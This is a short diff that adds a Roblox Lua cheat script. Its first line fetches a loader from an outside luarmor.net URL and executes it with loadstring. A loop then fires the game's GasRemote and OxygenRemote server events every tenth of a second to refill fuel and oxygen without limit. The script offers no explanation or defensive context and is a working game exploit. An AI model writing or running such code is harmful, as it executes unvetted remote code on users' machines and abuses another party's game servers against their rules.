@@ -1,0 +1,13 @@
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1c0de916624c2a9ef824fb3d733a29e3.lua"))()
+while true do
+wait(0.1)
+local ohInstance1 = workspace.GasolineCan.FuelCanUse
+local ohInstance2 = workspace.Submarine.Fuel
+
+workspace.kolba_D6XQU2.RemoteEvents.GasRemote:FireServer(ohInstance1, ohInstance2)
+
+local ohInstance1 = workspace.OxygenTube.Oxygen
+local ohInstance2 = game:GetService("Players").LocalPlayer.Oxygen
+
+workspace.kolba_D6XQU2.RemoteEvents.OxygenRemote:FireServer(ohInstance1, ohInstance2)
+end
